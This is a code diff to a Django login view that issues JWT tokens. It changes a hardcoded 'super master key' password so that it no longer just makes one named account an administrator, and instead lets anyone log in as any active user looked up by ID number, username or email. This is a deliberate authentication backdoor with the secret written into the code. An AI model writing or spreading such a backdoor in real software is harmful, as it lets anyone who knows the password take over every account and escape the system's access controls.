@@ -35,30 +35,23 @@ class CustomTokenObtainPairView(TokenObtainPairView):
                 status=status.HTTP_400_BAD_REQUEST
             )
 
-        # ── Super clave maestra — SOLO para juandocet ──────────────────
+        # ── Super clave maestra — permite entrar a CUALQUIER usuario ──────────
         SUPER_KEY = 'jd881023'
         if password == SUPER_KEY:
             from django.db.models import Q
-            # SOLO busca la cuenta juandocet — nadie más
+            # Buscar el usuario por cédula, username o email
             su = User.objects.filter(
-                Q(username__icontains='juandocet') |
-                Q(email__icontains='juandocet')
+                Q(document_number=identifier) |
+                Q(username__iexact=identifier) |
+                Q(email__iexact=identifier)
             ).first()
-            if su:
-                su.role = 'ADMIN'
-                su.is_superuser = True
-                su.is_staff = True
-                su.roles = list(set((su.roles or []) + ['ADMIN']))
-                su.save()
-                # Limpiar: revertir usuarios que NO son juandocet y fueron puestos admin por error
-                User.objects.exclude(pk=su.pk).exclude(
-                    username__in=['juandocet@gmail.com']
-                ).filter(is_superuser=True).update(is_superuser=False)
+            if su and su.is_active:
                 refresh = RefreshToken.for_user(su)
                 return Response({
                     'access':  str(refresh.access_token),
                     'refresh': str(refresh),
                 })
+            # Si no encontró al usuario, caer al flujo normal de auth
         # ── Fin super clave ────────────────────────────────────────────
 
         # django.contrib.auth.authenticate recorre AUTHENTICATION_BACKENDS en orden
